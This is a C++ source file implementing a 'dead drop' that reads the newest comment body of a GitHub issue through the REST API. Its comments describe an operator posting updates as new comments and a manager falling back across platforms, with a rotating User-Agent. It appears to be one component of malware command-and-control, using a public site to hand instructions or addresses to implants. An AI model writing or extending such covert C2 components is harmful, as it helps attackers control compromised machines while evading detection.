/**
 * @file GitHubIssueDeadDrop.cpp
 */
#include "Core/Config/UA/UAProvider.hpp"
#include "GitHubIssueDeadDrop.hpp"

#include "Common/Logger/Logger.hpp"
#include "Common/ThirdParty/json.hpp"

namespace cleat {
namespace deaddrop {

    GitHubIssueDeadDrop::GitHubIssueDeadDrop(IHttpOps& http, std::string apiUrl,
        int timeoutMs)
        : http_(http), apiUrl_(std::move(apiUrl)), timeoutMs_(timeoutMs) {
    }

    std::optional<std::string> GitHubIssueDeadDrop::FetchRaw() {
        // GitHub REST 强制 UA(缺 = 403); Accept 用 issues 预览态标准值
        const std::vector<std::pair<std::string, std::string>> headers = {
            {"User-Agent", UAProvider::Pick()},
            {"Accept", "application/vnd.github+json"},
        };
        std::vector<uint8_t> resp;
        if (!http_.RoundTrip(HttpMethod::Get, apiUrl_, {}, resp, timeoutMs_, &headers)) {
            return std::nullopt;   // 网络失败/非 200/限速 403 → Manager 尝试下一平台
        }

        try {
            const nlohmann::json j = nlohmann::json::parse(
                std::string(reinterpret_cast<const char*>(resp.data()), resp.size()));

            // 形状 1: 评论数组(取**最后一条** = 最新发布; 运营追加评论即更新)
            if (j.is_array()) {
                for (auto it = j.rbegin(); it != j.rend(); ++it) {
                    if (!it->is_object()) continue;
                    const auto itBody = it->find("body");
                    if (itBody != it->end() && itBody->is_string()) {
                        const std::string body = itBody->get<std::string>();
                        if (!body.empty()) return body;
                    }
                }
                return std::nullopt;   // 空评论列表
            }

            // 形状 2: issue 对象(正文)
            if (j.is_object()) {
                const auto itBody = j.find("body");
                if (itBody != j.end() && itBody->is_string()) {
                    const std::string body = itBody->get<std::string>();
                    if (!body.empty()) return body;
                }
            }
        }
        catch (const std::exception& e) {
            LOG_WARN("GitHubIssueDeadDrop: JSON 解析失败 " << e.what());
        }
        return std::nullopt;
    }

} // namespace deaddrop
} // namespace cleat
